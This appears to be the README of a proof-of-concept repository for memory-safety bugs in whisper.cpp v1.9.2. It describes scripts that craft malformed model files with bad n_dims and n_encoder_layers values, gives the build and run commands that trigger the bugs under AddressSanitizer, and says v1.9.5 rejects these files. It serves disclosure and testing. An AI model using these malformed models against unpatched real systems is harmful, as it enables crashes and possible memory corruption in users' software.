# PoC generators

The malformed models are produced from fixtures that ship in the whisper.cpp
repository, so no model binary is stored here.

| Script | Input fixture (in the whisper.cpp tree) | Output |
|---|---|---|
| `patch_ndims.py <in> <out> [n_dims]` | `models/for-tests-ggml-tiny.en.bin` | valid header and vocab, then one tensor record whose `n_dims` is the given value (default `0x40000000`), followed by 65536 bytes of `0x41` |
| `patch_vad_weight.py <in> <out> [n_dims]` | `models/for-tests-silero-v6.2.0-ggml.bin` | the VAD model with the `n_dims` of its first weight record replaced |
| `patch_vad.py <in> <out> [n_encoder_layers]` | `models/for-tests-silero-v6.2.0-ggml.bin` | the VAD model with `n_encoder_layers` replaced |

## Build the target

```sh
git clone https://github.com/ggml-org/whisper.cpp.git
cd whisper.cpp
git checkout v1.9.2
cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Debug -DWHISPER_SANITIZE_ADDRESS=ON \
      -DWHISPER_BUILD_TESTS=OFF -DWHISPER_BUILD_SERVER=OFF -DGGML_NATIVE=OFF -DGGML_OPENMP=OFF
ninja -C build whisper-cli
```

## Run

```sh
python3 -I poc/patch_ndims.py models/for-tests-ggml-tiny.en.bin evil-whisper-ndims.bin 8
ASAN_OPTIONS=detect_leaks=0 ./build/bin/whisper-cli -m evil-whisper-ndims.bin -f samples/jfk.wav

python3 -I poc/patch_vad_weight.py models/for-tests-silero-v6.2.0-ggml.bin evil-vad-ndims.bin 0x40000000
ASAN_OPTIONS=detect_leaks=0 ./build/bin/whisper-cli -m models/for-tests-ggml-tiny.en.bin \
      --vad --vad-model evil-vad-ndims.bin -f samples/jfk.wav

python3 -I poc/patch_vad.py models/for-tests-silero-v6.2.0-ggml.bin evil-vad-nlayers.bin 1
ASAN_OPTIONS=detect_leaks=0 ./build/bin/whisper-cli -m models/for-tests-ggml-tiny.en.bin \
      --vad --vad-model evil-vad-nlayers.bin -f samples/jfk.wav
```

Check out `v1.9.5` and repeat to see the fixed behaviour: each model is
rejected with an `invalid n_dims` / `invalid n_encoder_layers` error and a
non-zero exit status.
